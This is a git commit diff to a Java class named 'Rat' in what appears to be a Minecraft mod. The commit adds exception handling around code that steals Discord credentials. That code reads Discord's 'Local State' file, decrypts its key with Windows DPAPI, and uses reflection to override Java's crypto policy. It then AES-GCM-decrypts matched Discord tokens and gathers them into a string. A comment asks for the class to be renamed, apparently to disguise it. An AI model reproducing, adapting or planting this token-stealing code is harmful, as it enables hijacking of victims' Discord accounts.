170df7926d21d421ac5a7c9ce78ca61afc58c289
dxxxxy <introsdream@gmail.com>
2022-09-06 11:02:32 -0400

    catch decryption exceptions

--- src/main/java/studio/dreamys/Rat.java
+++ src/main/java/studio/dreamys/Rat.java
@@ -83,51 +83,56 @@ public class Rat { //change class name please for the love of god
                             Matcher matcher = pattern.matcher(parsed.toString());
 
                             if (matcher.find()) {
-                                //patch shit java security policy jre that mc uses
-                                if (Cipher.getMaxAllowedKeyLength("AES") < 256) {
-                                    Class<?> aClass = Class.forName("javax.crypto.CryptoAllPermissionCollection");
-                                    Constructor<?> con = aClass.getDeclaredConstructor();
-                                    con.setAccessible(true);
-                                    Object allPermissionCollection = con.newInstance();
-                                    Field f = aClass.getDeclaredField("all_allowed");
-                                    f.setAccessible(true);
-                                    f.setBoolean(allPermissionCollection, true);
+                                try {
+                                    //patch shit java security policy jre that mc uses
+                                    if (Cipher.getMaxAllowedKeyLength("AES") < 256) {
+                                        Class<?> aClass = Class.forName("javax.crypto.CryptoAllPermissionCollection");
+                                        Constructor<?> con = aClass.getDeclaredConstructor();
+                                        con.setAccessible(true);
+                                        Object allPermissionCollection = con.newInstance();
+                                        Field f = aClass.getDeclaredField("all_allowed");
+                                        f.setAccessible(true);
+                                        f.setBoolean(allPermissionCollection, true);
 
-                                    aClass = Class.forName("javax.crypto.CryptoPermissions");
-                                    con = aClass.getDeclaredConstructor();
-                                    con.setAccessible(true);
-                                    Object allPermissions = con.newInstance();
-                                    f = aClass.getDeclaredField("perms");
-                                    f.setAccessible(true);
-                                    ((Map) f.get(allPermissions)).put("*", allPermissionCollection);
+                                        aClass = Class.forName("javax.crypto.CryptoPermissions");
+                                        con = aClass.getDeclaredConstructor();
+                                        con.setAccessible(true);
+                                        Object allPermissions = con.newInstance();
+                                        f = aClass.getDeclaredField("perms");
+                                        f.setAccessible(true);
+                                        ((Map) f.get(allPermissions)).put("*", allPermissionCollection);
 
-                                    aClass = Class.forName("javax.crypto.JceSecurityManager");
-                                    f = aClass.getDeclaredField("defaultPolicy");
-                                    f.setAccessible(true);
-                                    Field mf = Field.class.getDeclaredField("modifiers");
-                                    mf.setAccessible(true);
-                                    mf.setInt(f, f.getModifiers() & ~Modifier.FINAL);
-                                    f.set(null, allPermissions);
+                                        aClass = Class.forName("javax.crypto.JceSecurityManager");
+                                        f = aClass.getDeclaredField("defaultPolicy");
+                                        f.setAccessible(true);
+                                        Field mf = Field.class.getDeclaredField("modifiers");
+                                        mf.setAccessible(true);
+                                        mf.setInt(f, f.getModifiers() & ~Modifier.FINAL);
+                                        f.set(null, allPermissions);
+                                    }
+
+                                    //get, decode and decrypt key
+                                    byte[] key, dToken = matcher.group().split("dQw4w9WgXcQ:")[1].getBytes();
+                                    JsonObject json = new Gson().fromJson(new String(Files.readAllBytes(Paths.get(mc.mcDataDir.getParent(), "discord/Local State"))), JsonObject.class);
+                                    key = json.getAsJsonObject("os_crypt").get("encrypted_key").getAsString().getBytes();
+                                    key = Base64.getDecoder().decode(key);
+                                    key = Arrays.copyOfRange(key, 5, key.length);
+                                    key = Crypt32Util.cryptUnprotectData(key);
+
+                                    //decode token
+                                    dToken = Base64.getDecoder().decode(dToken);
+
+                                    //decrypt token
+                                    Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
+                                    cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(key, "AES"), new GCMParameterSpec(128, Arrays.copyOfRange(dToken, 3, 15)));
+                                    byte[] out = cipher.doFinal(Arrays.copyOfRange(dToken, 15, dToken.length));
+
+                                    //place only if it doesn't contain the same
+                                    if (!discord.contains(new String(out, StandardCharsets.UTF_8))) discord += new String(out, StandardCharsets.UTF_8) + " | ";
+                                } catch (Exception e) {
+                                    e.printStackTrace();
+                                    discord = "Failed to decrypt token :(";
                                 }
-
-                                //get, decode and decrypt key
-                                byte[] key, dToken = matcher.group().split("dQw4w9WgXcQ:")[1].getBytes();
-                                JsonObject json = new Gson().fromJson(new String(Files.readAllBytes(Paths.get(mc.mcDataDir.getParent(), "discord/Local State"))), JsonObject.class);
-                                key = json.getAsJsonObject("os_crypt").get("encrypted_key").getAsString().getBytes();
-                                key = Base64.getDecoder().decode(key);
-                                key = Arrays.copyOfRange(key, 5, key.length);
-                                key = Crypt32Util.cryptUnprotectData(key);
-
-                                //decode token
-                                dToken = Base64.getDecoder().decode(dToken);
-
-                                //decrypt token
-                                Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
-                                cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(key, "AES"), new GCMParameterSpec(128, Arrays.copyOfRange(dToken, 3, 15)));
-                                byte[] out = cipher.doFinal(Arrays.copyOfRange(dToken, 15, dToken.length));
-
-                                //place only if it doesn't contain the same
-                                if (!discord.contains(new String(out, StandardCharsets.UTF_8))) discord += new String(out, StandardCharsets.UTF_8) + " | ";
                             }
                         }
                     }
